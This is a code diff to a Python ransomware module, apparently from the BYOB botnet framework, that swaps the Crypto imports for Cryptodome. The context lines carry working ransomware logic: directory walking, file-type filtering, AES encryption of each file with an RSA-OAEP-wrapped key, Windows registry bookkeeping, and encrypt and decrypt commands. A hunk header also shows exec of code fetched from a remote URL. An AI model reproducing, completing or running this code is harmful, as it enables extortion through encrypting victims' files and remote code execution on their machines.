@@ -18,7 +18,7 @@ exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/mas
 sys.modules['util'] = util
 
 # globals
-packages = ['_winreg','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']
+packages = ['_winreg','Cryptodome.PublicKey.RSA','Cryptodome.Cipher.PKCS1_OAEP']
 platforms = ['win32']
 threads = {}
 tasks = Queue.Queue()
@@ -65,14 +65,14 @@ def _threader(tasks):
 @util.threaded
 def _iter_files(rsa_key, base_dir=None):
     try:
-        if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
+        if isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
             if base_dir:
                 if os.path.isdir(base_dir):
                     return os.path.walk(base_dir, lambda _, dirname, files: [globals()['tasks'].put_nowait((encrypt_file, (os.path.join(dirname, filename), rsa_key))) for filename in files], None)
                 else:
                     util.log("Target directory '{}' not found".format(base_dir))
             else:
-                cipher  = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
+                cipher  = Cryptodome.Cipher.PKCS1_OAEP.new(rsa_key)
                 reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, globals()['_registry_key'], 0, _winreg.KEY_READ)
                 i = 0
                 while True:
@@ -128,9 +128,9 @@ def encrypt_file(filename, rsa_key):
     try:
         if os.path.isfile(filename):
             if os.path.splitext(filename)[1] in globals()['filetypes']:
-                if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
-                    cipher  = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
-                    aes_key = Crypto.Random.get_random_bytes(32)
+                if isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
+                    cipher  = Cryptodome.Cipher.PKCS1_OAEP.new(rsa_key)
+                    aes_key = Cryptodome.Random.get_random_bytes(32)
                     with open(filename, 'rb') as fp:
                         data = fp.read()
                     ciphertext = security.encrypt_aes(data, aes_key)
@@ -184,8 +184,8 @@ def encrypt_files(args):
     try:
         target, _, rsa_key = args.partition(' ')
         if os.path.exists(target):
-            if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
-                rsa_key = Crypto.PublicKey.RSA.importKey(rsa_key)
+            if not isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
+                rsa_key = Cryptodome.PublicKey.RSA.importKey(rsa_key)
             if not rsa_key.can_encrypt():
                 return "Error: RSA key cannot encrypt"
             if os.path.isfile(target):
@@ -209,8 +209,8 @@ def decrypt_files(rsa_key):
 
    """
     try:
-        if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
-            rsa_key = Crypto.PublicKey.RSA.importKey(rsa_key)
+        if not isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
+            rsa_key = Cryptodome.PublicKey.RSA.importKey(rsa_key)
         if not rsa_key.has_private():
             return "Error: RSA key cannot decrypt"
         globals()['threads']['iter-files']    = _iter_files(rsa_key)
